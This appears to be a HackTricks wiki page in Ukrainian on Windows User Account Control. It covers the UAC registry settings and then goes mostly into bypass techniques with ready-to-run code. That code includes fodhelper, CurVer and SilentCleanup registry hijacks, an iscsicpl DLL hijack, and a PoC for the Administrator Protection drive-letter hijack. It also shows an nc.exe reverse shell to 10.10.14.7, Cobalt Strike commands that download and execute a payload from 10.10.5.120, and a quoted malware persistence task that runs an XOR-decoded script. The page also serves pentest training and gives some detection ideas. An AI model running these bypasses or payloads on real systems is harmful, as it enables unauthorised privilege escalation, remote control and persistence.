# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) — це функція, яка забезпечує **запит надання згоди для дій із підвищеними привілеями**. Програми мають різні рівні `integrity`, і програма з **високим рівнем** може виконувати завдання, які **потенційно можуть скомпрометувати систему**. Коли UAC увімкнено, програми та завдання завжди **виконуються в контексті безпеки облікового запису неадміністратора**, якщо тільки адміністратор явно не дозволить цим програмам/завданням отримати доступ до системи на рівні адміністратора. Це функція зручності, яка захищає адміністраторів від ненавмисних змін, але не вважається межею безпеки.<sup>[[2]](#references)</sup>

Докладніше про рівні цілісності:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Коли UAC активовано, користувач-адміністратор отримує 2 токени: токен стандартного користувача для виконання звичайних дій із середнім рівнем цілісності та токен із привілеями адміністратора.

На цій [сторінці](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) детально описано принцип роботи UAC, зокрема процес входу, взаємодію з користувачем і архітектуру UAC.<sup>[[2]](#references)</sup> Адміністратори можуть використовувати політики безпеки для налаштування роботи UAC відповідно до потреб організації на локальному рівні (за допомогою secpol.msc) або налаштовувати їх і розгортати через об’єкти групової політики (GPO) у середовищі домену Active Directory. Різні налаштування детально розглянуто [тут](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Для UAC можна налаштувати 10 параметрів групової політики. У таблиці нижче наведено додаткові відомості:

| Параметр групової політики                                                                                                                                                                                                                                                                                                                                                           | Ключ реєстру                | Типове налаштування                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Вимкнено)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Запит згоди для бінарних файлів, що не належать Windows, на захищеному робочому столі) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Запит облікових даних на захищеному робочому столі)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Увімкнено; за замовчуванням вимкнено в Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Вимкнено)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Увімкнено)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Увімкнено)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Вимкнено)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Увімкнено)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Увімкнено)                                              |

### Політики встановлення програмного забезпечення у Windows

**локальні політики безпеки** ("secpol.msc" у більшості систем) за замовчуванням налаштовані так, щоб **забороняти користувачам без прав адміністратора встановлювати програмне забезпечення**. Це означає, що навіть якщо користувач без прав адміністратора може завантажити інсталятор вашого програмного забезпечення, він не зможе запустити його без облікового запису адміністратора.

### Ключі реєстру для примусового запиту UAC на підвищення привілеїв

Як стандартний користувач без прав адміністратора, ви можете забезпечити, щоб для **стандартного** облікового запису UAC **запитував облікові дані**, коли він намагається виконати певні дії. Для цього потрібно змінити певні **ключі реєстру**, що вимагає дозволів адміністратора, якщо немає **UAC bypass** або зловмисник уже не ввійшов як адміністратор.

Навіть якщо користувач входить до групи **Administrators**, ці зміни змушують користувача **повторно ввести облікові дані свого облікового запису**, щоб виконати адміністративні дії.

**На практиці це корисно лише тоді, коли у вас уже є токен із підвищеними привілеями, UAC bypass або помилкова конфігурація, яка дозволяє змінювати ці ключі; в іншому разі сам запис до реєстру буде заблоковано.**

Потрібно змінити такі ключі та записи реєстру (типові значення наведено в дужках):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Це також можна зробити вручну через інструмент Local Security Policy. Після внесення змін під час виконання адміністративних операцій користувачеві буде запропоновано повторно ввести облікові дані.

### Примітка

**User Account Control не є межею безпеки.** Тому стандартні користувачі не можуть вийти за межі своїх облікових записів і отримати права адміністратора без exploit для локального підвищення привілеїв.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode використовує перевірки цілісності, щоб запобігти доступу процесів із високим рівнем цілісності (як-от web browsers) до даних із низьким рівнем цілісності (як-от папки тимчасових файлів Internet). Це забезпечується запуском browser із токеном низького рівня цілісності. Коли browser намагається отримати доступ до даних, що зберігаються в зоні низького рівня цілісності, операційна система перевіряє рівень цілісності процесу та відповідно дозволяє доступ. Ця функція допомагає запобігати атакам віддаленого виконання коду, які намагаються отримати доступ до конфіденційних даних у системі.
- Коли користувач входить до Windows, система створює токен доступу, що містить список привілеїв користувача. Привілеї визначаються як сукупність прав і можливостей користувача. Токен також містить список облікових даних користувача — даних, які використовуються для автентифікації користувача на комп’ютері та в ресурсах мережі.

### Autoadminlogon

Щоб налаштувати автоматичний вхід до Windows певного користувача під час запуску, встановіть **`AutoAdminLogon` registry key**. Це корисно для середовищ кіосків або з метою тестування. Використовуйте це лише в захищених системах, оскільки пароль буде відкрито збережено в registry.

Встановіть наведені нижче ключі за допомогою Registry Editor або `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Щоб повернути звичайну поведінку входу, встановіть `AutoAdminLogon` у значення 0.

## UAC bypass

> [!TIP]
> Зверніть увагу: якщо у вас є graphical access до victim, UAC bypass є простим, оскільки можна просто натиснути "Yes", коли з’явиться запит UAC

UAC bypass потрібен у такій ситуації: **UAC активовано, ваш process працює в контексті середнього рівня цілісності, а ваш user належить до administrators group**.

Важливо зазначити, що **обійти UAC значно складніше, якщо встановлено найвищий рівень безпеки (Always), ніж якщо встановлено будь-який інший рівень (Default).**

### Fast triage from a medium-integrity shell

Перед спробою bypass переконайтеся, що ви перебуваєте в потрібному сценарії, і зіставте build хоста з відомими робочими методами:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Практичні примітки:
- Якщо `EnableLUA=0`, bypass не потрібен: будь-який admin token може напряму запросити high integrity.
- `ConsentPromptBehaviorAdmin=2` або `5` — типовий сценарій для auto-elevate / COM-based bypasses.
- `Always Notify` підвищує вимоги, але все одно слід тестувати точну build, а не припускати невдачу: UACME досі відстежує деякі методи, сумісні з `AlwaysNotify`, у сучасних Windows builds.<sup>[[3]](#references)</sup>

### UAC вимкнено

Якщо UAC уже вимкнено (`ConsentPromptBehaviorAdmin` має значення **`0`**), можна **запустити reverse shell з admin privileges** (high integrity level), використовуючи щось на кшталт:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Дуже** базовий UAC "bypass" (повний доступ до файлової системи)

Якщо у вас є shell користувача, який входить до групи Administrators, ви можете локально **підключити спільний ресурс C$** через SMB (файлову систему) як новий диск і отримати **доступ до всього в файловій системі** (навіть до домашньої папки Administrator).

> [!WARNING]
> **Схоже, цей трюк більше не працює**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with Cobalt Strike

Техніки Cobalt Strike працюватимуть лише якщо для UAC не встановлено максимальний рівень безпеки
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** та **Metasploit** також мають кілька модулів для **обходу** **UAC**.

### Підвищені COM-інтерфейси (`ICMLuaUtil` / `CMSTPLUA`)

Автоматично підвищені COM-об'єкти залишаються практичною поверхнею UAC у сучасних збірках. `ICMLuaUtil` досі позначений у UACME як такий, що працює в актуальних гілках Windows, а offensive tooling продовжує адаптувати `CMSTPLUA`, комбінуючи процес на інтерактивному робочому столі, 64-бітне виконання та іноді PEB/process masquerading перед викликом COM Elevation Moniker.<sup>[[3]](#references)</sup>

Практичні поради:
- Віддавайте перевагу **64-бітному** процесу в **інтерактивній сесії** користувача (зазвичай `explorer.exe` або його дочірньому процесу).
- Якщо raw shell не працює, повторіть спробу з BOF / реалізацією UACME замість наївної обгортки `CreateProcess`.
- Очікуйте, що дочірнє виконання відбуватиметься в **окремому підвищеному процесі**; багато BOF не підвищують поточний beacon безпосередньо.

### KRBUACBypass

Документація та інструмент доступні за посиланням [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Експлойти обходу UAC

[**UACME** ](https://github.com/hfiref0x/UACME) — це **збірка** кількох експлойтів обходу UAC. Зверніть увагу, що вам потрібно **зібрати UACME за допомогою Visual Studio або MSBuild**. Компіляція створить кілька виконуваних файлів (наприклад, `Source\Akagi\outout\x64\Debug\Akagi.exe`), і вам потрібно буде знати, **який саме вам потрібен.**\
Слід бути **обережними**, оскільки деякі bypass можуть **викликати інші програми**, які **повідомлять** **користувача**, що щось відбувається.<sup>[[3]](#references)</sup>

UACME містить **версію збірки, починаючи з якої кожна техніка почала працювати**.<sup>[[3]](#references)</sup> Ви можете знайти техніку, яка впливає на ваші версії:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Також за допомогою [цієї](https://en.wikipedia.org/wiki/Windows_10_version_history) сторінки можна визначити випуск Windows `1607` за версіями збірок.

Практичний робочий процес полягає в тому, щоб спочатку **оцінити збірку хоста**, а вже потім запустити відповідний метод:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` швидко порівнює локальну збірку з відомими методами UAC, що корисно для швидкого відсіювання непрацюючих PoC.<sup>[[4]](#references)</sup>
- `UACME` залишається найкращим публічним каталогом для зіставлення bypass із точною збіркою. У нещодавніх релізах додано нові методи та повторно протестовано наявні проти **Windows 11 25H2**, тому перевірте README/нотатки до релізу, перш ніж вважати, що старий допис у блозі все ще застосовується без змін.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Довірений бінарний файл `fodhelper.exe` має auto-elevate у сучасних версіях Windows. Під час запуску він запитує наведений нижче per-user шлях до реєстру, не перевіряючи verb `DelegateExecute`. Розміщення там команди дає змогу процесу з Medium Integrity (користувач входить до Administrators) запустити процес із High Integrity без запиту UAC.

Шлях до реєстру, який запитує fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Кроки PowerShell (встановіть свій payload, потім запустіть)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Примітки:
- Працює, коли поточний користувач є членом групи Administrators, а рівень UAC встановлено за замовчуванням/у поблажливому режимі (не Always Notify із додатковими обмеженнями).
- Використовуйте шлях `sysnative`, щоб запустити 64-бітний PowerShell із 32-бітного процесу у 64-бітній Windows.
- Payload може бути будь-якою командою (PowerShell, cmd або шляхом до EXE). Для прихованості уникайте UI, які запитують підтвердження.

#### Варіант із викраденням CurVer/розширення (лише HKCU)

Останні зразки, що зловживають `fodhelper.exe`, уникають `DelegateExecute` і натомість **перенаправляють ProgID `ms-settings`** через значення `CurVer` для конкретного користувача. Автоматично підвищуваний бінарний файл усе одно знаходить обробник у `HKCU`, тому для створення ключів не потрібен токен адміністратора:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Після підвищення привілеїв malware зазвичай **вимикає майбутні запити** шляхом встановлення `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` у значення `0`, після чого виконує додаткове defense evasion (наприклад, `Add-MpPreference -ExclusionPath C:\ProgramData`) і повторно створює persistence для запуску з high integrity. Типове завдання persistence зберігає **XOR-encrypted PowerShell script** на диску та щогодини декодує й виконує його в пам’яті:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Цей варіант усе ще очищає dropper і залишає лише staged payloads, тому виявлення залежить від моніторингу **`CurVer` hijack**, втручання в `ConsentPromptBehaviorAdmin`, створення виключення Defender або запланованих завдань, які розшифровують PowerShell у пам’яті.<sup>[[5]](#references)</sup>

### Обхід UAC через завдання `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` запускає `cleanmgr.exe` з найвищими привілеями та розгортає `%windir%` із середовища користувача. Якщо ви контролюєте `HKCU\Environment\windir`, можна перенаправити це розгортання на довільну команду й отримати високий рівень цілісності без діалогового вікна підтвердження.<sup>[[8]](#references)</sup> Цей метод усе ще варто тестувати на останніх збірках, оскільки UACME продовжує підтримувати цю техніку, а відстеження останніх проблем показує, що для Windows 11 24H2 можуть знадобитися лише незначні зміни в лапках.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Якщо завдання додає лапку до шляху в цій збірці, повторіть спробу з payload, що закінчується лапкою (наприклад, `cmd.exe"`). Завжди очищайте `HKCU\Environment\windir` після тестування.

#### Більше UAC bypass

Багато класичних UAC bypass, які зловживають UI-потоками, COM-об'єктами або взаємодією з desktop, потребують **повної інтерактивної сесії** з жертвою; звичайного shell через `nc.exe` або service, що працює в **Session 0**, часто недостатньо.

Зазвичай це можна вирішити за допомогою сесії **meterpreter**. Виконайте міграцію до **process**, у якого значення **Session** дорівнює **1**:

![Point ms-settings to a custom extension (.thm) and map that extension to our payload - More UAC bypass: You can get using a meterpreter session. Migrate to a process that has the Session...](<../../images/image (863).png>)

(_explorer.exe_ має працювати)

### UAC Bypass через GUI

Якщо у вас є доступ до **GUI**, ви можете просто прийняти запит UAC, коли він з'явиться; технічний bypass насправді не потрібен. Тому отримання GUI-сесії часто достатньо, щоб усунути практичні перешкоди, додані UAC.

Крім того, якщо ви отримали GUI-сесію, якою хтось користувався (потенційно через RDP), там можуть працювати **деякі tools від імені administrator**, звідки ви могли б **запустити** **cmd**, наприклад, безпосередньо **як admin**, і UAC більше не запитуватиме підтвердження, як у [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Це може бути трохи більш **stealthy**.

### Шумний brute-force UAC bypass

Якщо вас не турбує створення шуму, ви завжди можете **запустити щось на кшталт** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), що **запитує підвищення permissions, доки user не погодиться**.

### Власний bypass - базова методологія UAC bypass

Якщо ви переглянете **UACME**, то помітите, що **багато UAC bypass зловживають DLL hijacking** (часто змушуючи elevated binary завантажити DLL, контрольовану attacker, із writable path). [Прочитайте це, щоб дізнатися, як знайти vulnerability DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Знайдіть binary, який виконує **autoelevate** (перевірте, що під час виконання він запускається з high integrity level).
2. За допомогою procmon знайдіть події "**NAME NOT FOUND**", які можуть бути вразливими до **DLL Hijacking**.
3. Ймовірно, вам потрібно буде **записати** DLL у деякі **protected paths** (наприклад, C:\Windows\System32), де у вас немає permissions на запис. Це можна обійти за допомогою:
1. **wusa.exe**: Windows 7,8 і 8.1. Він дає змогу розпакувати вміст CAB-файлу в protected paths (оскільки цей tool запускається з high integrity level).
2. **IFileOperation**: Windows 10.
4. Підготуйте **script**, щоб скопіювати вашу DLL у protected path і виконати вразливий та autoelevated binary.

### Інша техніка UAC bypass

Полягає в перевірці, чи намагається **autoElevated binary** прочитати з **registry** **name/path** **binary** або **command**, який потрібно **виконати** (це цікавіше, якщо binary шукає цю інформацію всередині **HKCU**).

### UAC bypass через `SysWOW64\iscsicpl.exe` + DLL hijack через user `PATH`

32-бітний `C:\Windows\SysWOW64\iscsicpl.exe` — це **auto-elevated** binary, яким можна зловживати для завантаження `iscsiexe.dll` відповідно до search order. Якщо ви можете розмістити malicious `iscsiexe.dll` у **user-writable** folder, а потім змінити `PATH` поточного user (наприклад, через `HKCU\Environment\Path`), щоб цей folder перевірявся, Windows може завантажити attacker DLL у процес elevated `iscsicpl.exe` **без відображення UAC prompt**.<sup>[[1]](#references)[[6]](#references)</sup>

Практичні примітки:
- Це корисно, коли поточний user входить до **Administrators**, але працює з **Medium Integrity** через UAC.
- Для цього bypass важливою є копія **SysWOW64**. Вважайте копію **System32** окремим binary і перевіряйте її поведінку незалежно.
- Примітив є поєднанням **auto-elevation** і **DLL search-order hijacking**, тому той самий workflow у ProcMon, який використовується для інших UAC bypass, корисний для перевірки завантаження відсутньої DLL.

Мінімальний flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ідеї для виявлення:
- Створюйте сповіщення про `reg add` / записи до реєстру в `HKCU\Environment\Path`, за якими одразу відбувається запуск `C:\Windows\SysWOW64\iscsicpl.exe`.
- Виконуйте пошук `iscsiexe.dll` у розташуваннях, **контрольованих користувачем**, таких як `%TEMP%` або `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Встановлюйте кореляцію між запусками `iscsicpl.exe` і неочікуваними дочірніми процесами або завантаженням DLL із директорій поза межами стандартних директорій Windows.

### Новіші дослідження, які варто перевірити окремо

Деякі ланцюжки після 2024 року більше не мають вигляду класичних registry hijack у `HKCU\Software\Classes`. Наприклад, poisoning activation-context cache може поєднувати **перепризначення диска** та **DLL redirection**, щоб перейти від середньої до високої цілісності через довірені UI / auto-elevated бінарні файли, такі як `ctfmon.exe`, а згодом і через цілі на кшталт `fodhelper.exe`. Замість дублювання великого PoC тут перегляньте компактні приклади payload у:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Перехоплення літери диска Administrator Protection (25H2) через DOS device map для окремої сесії входу

Щоб ознайомитися з повною поверхнею атаки `RAiLaunchAdminProcess` / UIAccess у Windows 11 25H2, перегляньте спеціальну сторінку:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” використовує shadow-admin tokens із per-session maps `\Sessions\0\DosDevices/<LUID>`. Директорія створюється відкладено `SeGetTokenDeviceMap` під час першого розв’язання `\??`. Якщо attacker impersonates shadow-admin token лише на рівні **SecurityIdentification**, директорія створюється з attacker як **owner** (успадковує `CREATOR OWNER`), що дає змогу створювати drive-letter links, які мають пріоритет над `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Кроки:**

1. Із сесії з низькими привілеями викличте `RAiProcessRunOnce`, щоб запустити promptless shadow-admin `runonce.exe`.
2. Клонувати його primary token у **identification** token і impersonate його під час відкриття `\??`, щоб примусово створити `\Sessions\0\DosDevices/<LUID>` у власності attacker.
3. Створіть symlink `C:` там, вказуючи на storage, контрольоване attacker; подальші доступи файлової системи в цій сесії розв’язуватимуть `C:` у шлях attacker, що дає змогу виконати DLL/file hijack без prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Посилання

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Документація Microsoft – Як працює User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – збірка технік обходу UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – сканер сумісності та launcher для обходу UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Дослідження Checkpoint – KONNI використовує AI для генерації PowerShell-бекдорів](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Дослідження Check Point – Operation TrueChaos: експлуатація 0-day проти урядових цілей у Південно-Східній Азії](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – обхід Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – обхід UAC за допомогою завдання SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
